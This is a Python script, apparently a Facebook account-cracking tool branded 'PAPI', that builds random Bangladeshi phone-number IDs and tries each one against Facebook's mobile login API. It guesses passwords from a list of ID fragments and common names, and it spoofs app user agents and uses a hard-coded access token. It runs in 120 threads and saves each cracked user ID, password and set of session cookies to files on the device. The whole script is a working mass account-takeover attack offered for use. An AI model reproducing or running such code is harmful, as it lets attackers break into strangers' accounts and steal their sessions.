import os
import sys
import json
import uuid
import string
import random
import requests
from concurrent.futures import ThreadPoolExecutor as tred

def God():
	version=str(random.randint(5,14))
	code=str(random.randint(40,450))
	wid=str(random.randint(720,1280))
	heigh=str(random.randint(1280,2400))
	veer=str(random.randint(111111111,999999999))
	models=random.choice(["SM-P610N", "SM-P615", "SM-P610"])
	model2=random.choice(["RMX3740", "RMX3741"])
	model3=random.choice(["220333QAG", "220333QBI", "220333QNY", "220333QL"])
	model4=random.choice(["ASUS_Z017DB", "ASUS_Z017D", "ASUS_Z017DA", "ASUS_Z017DC", "ASUS_ZE520KL", "ASUS_ZA520KL"])
	facebook=random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid","com.facebook.katana|FB4A","com.facebook.orca|Orca-Android","com.facebook.mlite|MessengerLite"])
	face=facebook.split("|") [1]
	face2=facebook.split("|") [0]
	ua1=f"[FBAN/"+face+";FBAV/"+str(random.randint(11,99))+".0.0."+str(random.randint(1111,9999))+";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/"+face+";FBAV/"+code+".0.0.22.104;FBPN/"+face2+";FBLC/id_ID;FBBV/"+veer+";FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBDV/"+models+";FBSV/11.8.5;FBCA/armeabi-v7a:armeabi;FBDM/{density="+str(random.randint(1,3))+".25,width="+wid+",height="+heigh+"};FB_FW/1;]"
	ua2=f"[FBAN/"+face+";FBAV/"+str(random.randint(11,99))+".0.0."+str(random.randint(1111,9999))+";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/"+face+";FBAV/"+code+".0.0.28.111;FBPN/"+face2+";FBLC/en_GB;FBBV/"+veer+";FBCR/Banglalink;FBMF/Realme;FBBD/Realme;FBDV/"+model2+";FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/{density="+str(random.randint(2,4))+".75,width="+wid+",height="+heigh+"};FB_FW/1;]"
	ua3=f"[FBAN/"+face+";FBAV/"+str(random.randint(11,99))+".0.0."+str(random.randint(1111,9999))+";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/"+face+";FBAV/"+code+".0.0.12.120;FBPN/"+face2+";FBLC/en_GB;FBBV/"+veer+";FBCR/Robi;FBMF/Xiaomi;FBBD/Redmi;FBDV/"+model3+";FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density="+str(random.randint(1,4))+".625,width="+wid+",height="+heigh+"};FB_FW/1;]"
	ua4=f"[FBAN/"+face+";FBAV/"+str(random.randint(11,99))+".0.0."+str(random.randint(1111,9999))+";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/"+face+";FBAV/"+code+".0.0.32.114;FBPN/"+face2+";FBLC/en_GB;FBBV/"+veer+";FBCR/Airtel;FBMF/Asus;FBBD/Asus;FBDV/"+model4+";FBSV/7.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density="+str(random.randint(1,3))+".0,width="+wid+",height="+heigh+"};FB_FW/1;]"
	return random.choice([ua1,ua2,ua3,ua4])        
#------------colour code -----------#
orange = "\x1b[38;5;196m"
yellow = "\x1b[38;5;208m"
black="\033[1;30m"
rad="\x1b[38;5;160m"
green="\x1b[38;5;46m"
yelloww="\033[1;33m"
blue="\033[38;5;6m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\033[1;37m"
faltu = "\033[1;47m"
pvt = "\033[1;0m"
gren = "\x1b[38;5;154m"
gas = "\033[1;32m"
M = '\x1b[1;96m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
P = '\x1b[1;97m'
M = '\x1b[1;96m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;96m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])   
def linex():print(f'\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')  
####    
class Mr_Code:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.gen = []
    
    def banner(self):
        os.system("clear")
        print(f'''
{cyan}d8888b.  .d8b.  d8888b. d888888b 
{cyan}88  `8D d8' `8b 88  `8D   `88'   
{cyan}88oodD' 88ooo88 88oodD'    88    
{cyan}88~~~   88~~~88 88~~~      88    
{cyan}88      88   88 88        .88.   
{cyan}88      YP   YP 88      Y888888P {white}{rad}┼{faltu}{rad}🔹4.3🔹{pvt}{green}{rad}┼
{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{rad}[{white}◆{rad}] {green}DEVELOPER  {white}▶︎ {gren}ℳℛ ℙᎯℙℐ
{rad}[{white}◆{rad}] {green}FACEBOOK   {white}▶︎ {gren}꯭𒄬𓅋 𝐓𝐇𝐄 ⟬𝐋𝐄𝐆𝐄𝐍𝐃
{rad}[{white}◆{rad}] {green}WORKING    {white}▶︎ {white}{rad}┼{faltu}{rad}FREE🔹RANDOM{pvt}{green}{rad}┼
{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
    
    def Main(self):
        self.banner()
      #  print(f'\x1b[38;5;244m({P}+\x1b[38;5;244m)\x1b[1;96m EXAMPLE : 017 | 019 | 018 | 016 ');linex()
     #   os.system("clear")
        code = input(" SIM CODE : ")
     #   print(f'\x1b[38;5;244m({P}+\x1b[38;5;244m)\x1b[1;96m EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
      #  os.system("clear")
        limit = int(input(" ID LIMIT : "))
        for a in range(limit):
            xxx = "".join(random.choice(string.digits) for _ in range(8))
            self.gen.append(xxx)
        with tred(max_workers=120) as randx:
            print(" IF NO RESULT USE FLIGHT MODE")
            print("----------------------------------")
            for love in self.gen:
                ids = code + love
                passlist = [ids,ids[:8],ids[:7],ids[:6],love,love[1:],love[2:],'Bangla','bangladesh','@#@#@#','@@@###','aabbcc','aaabbb','১২৩৪৫৬','১২৩৪৫৬৭৮','405060','708090','sadiya','Bangladesh','jannat','mehedi','mababa','taniya','sumaiya','saiful','jannatul','farjana','sabbir','humaira','alamin','mimmim','sabbir','hridoy','fariya','shakil','roksana','mafiya','habiba','free fire','shahin','i love you','sadiya','ayesha','nusrat','Bangla','arfan@#','gaming','tamanna','jannat','laboni']
                randx.submit(self.method,ids,passlist)
        print("\n")
        print("----------------------------------")
    
    def method(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r\x1b[38;5;46m[𝕄Ꮢ-ℙ𝔸ℙ𝕀] {self.loop}|RND|OK:-{len(self.oks)}|CP:-{len(self.cps)}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                data = {
                'adid':str(uuid.uuid4()),
                'format':'json',
                'device_id':str(uuid.uuid4()),
                'email':ids,
                'password':pas,
                'generate_analytics_claims':'1',
                'community_id':'',
                'cpl':'true',
                'try_num':'1',
                'family_device_id':str(uuid.uuid4()),
                'credentials_type':'password',
                'source':'login',
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                'currently_logged_in_userid':'0',
                'locale':'en_US',
                'client_country_code':'US',
                'fb_api_req_friendly_name':'authenticate',
                'api_key':'882a8490361da98702bf97a021ddc14d',
                'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                head = {
                'User-Agent':self.randua(),
                'Accept-Encoding':'gzip, deflate',
                'Connection':'close',
                'Content-Type':'application/x-www-form-urlencoded',
                'Host':'graph.facebook.com',
                'X-FB-Net-HNI':str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI':str(random.randint(20000, 40000)),
                'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type':'MOBILE.LTE',
                'X-Tigon-Is-Retry':'False',
                'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags':'graphservice',
                'X-FB-HTTP-Engine':'Liger',
                'X-FB-Client-IP':'True',
                'X-FB-Server-Cluster':'True',
                'x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
                url = "https://b-graph.facebook.com/auth/login"
                response = requests.post(url,data=data,headers=head).json()
                if "access_token" in response:
                    uid = str(response['uid'])
                    coki = ";".join(i["name"] + "=" + i["value"] for i in response["session_cookies"])
                    print(f"\r\r\x1b[38;5;46m<ℙᎯℙℐ-ᎾᏦ> • {uid} • {pas}")
                    print(f"\r\r\x1b[38;5;244m(\x1b[1;96mĆØØҜƗ€\x1b[38;5;244m)>{asu} "+coki);linex()
                    open("/sdcard/PAPI-RNDM-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                    self.oks.append(uid)
                    break
                elif "www.facebook.com" in response["error"]["message"]:
              #  	print(f"\r\r\x1b[38;5;46m<PAPI-cp> • {uid} • {pas}")
                    open("/sdcard/PAPI-RNDM-cp.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                    self.cps.append(uid)
                    break
                else:continue
            self.loop += 1
        except Exception as e:pass
    
    def randua(self):
        ua1 = "[FBAN/FB4A;FBAV/405.0.0.23.72;FBBV/453370252;FBDM/{density=3.0,width=1080,height=2156};FBLC/it_IT;FBRV/455160500;FBCR/FASTWEB;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2065;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
        ua2 = "[[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235247;FBDM/{density=3.0,width=1080,height=2132};FBLC/en_US;FBRV/235412020;FBCR/airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1893;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        ua3 = "[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=2.0,width=720,height=1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1931;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]"
        ua4 = "[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950338;FBDM/{density=3.0,width=1080,height=2107};FBLC/ru_RU;FBRV/337672225;FBCR/Beeline;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1M;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
        ua5 = "[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027753;FBDM/{density=2.0,width=720,height=1412};FBLC/en_US;FBRV/0;FBCR/Jio 4G;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX1945;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        ua6 = "[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027753;FBDM/{density=2.0,width=720,height=1412};FBLC/en_US;FBRV/0;FBCR/Jio 4G;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX1945;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        ua7 = "FBAN/FB4A;FBAV/335.0.0.28.118;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/316527966;FBCR/Bezlimit;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2220};FB_FW/1;FBRV/317757053;]"
        ua8 = "[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957652;FBDM/{density=3.0,width=1080,height=2224};FBLC/ru_RU;FBRV/335247818;FBCR/Tele2You;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/STK-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
        ua9 = "[FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906223;FBDM/{density=2.9125001,width=2560,height=1516};FBLC/ru_RU;FBRV/296240860;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SCM-W09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
        ua10 = "[FBAN/FB4A;FBAV/10.0.0.28.27;FBBV/2802760;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_CA;FBCR/VIRGIN;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/4.4.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        max = random.choice([ua1,ua2,ua3,ua4,ua5,ua6,ua7,ua8,ua9,ua10])
        return str(max)
        
    def randuaa(self):
        ua1 = "[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027753;FBDM/{density=2.0,width=720,height=1412};FBLC/en_US;FBRV/0;FBCR/Jio 4G;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX1945;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        ua2 = "FBAN/FB4A;FBAV/335.0.0.28.118;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/316527966;FBCR/Bezlimit;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2220};FB_FW/1;FBRV/317757053;]"
        ua3 = "[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957652;FBDM/{density=3.0,width=1080,height=2224};FBLC/ru_RU;FBRV/335247818;FBCR/Tele2You;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/STK-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
        ua4 = "[FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906223;FBDM/{density=2.9125001,width=2560,height=1516};FBLC/ru_RU;FBRV/296240860;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SCM-W09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
        ua5 = "[FBAN/FB4A;FBAV/10.0.0.28.27;FBBV/2802760;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_CA;FBCR/VIRGIN;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/4.4.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        max = random.choice([ua1,ua2,ua3,ua4,ua5])
        return str(max)
   
    
       

if __name__ == "__main__":
    Mr_Code().Main()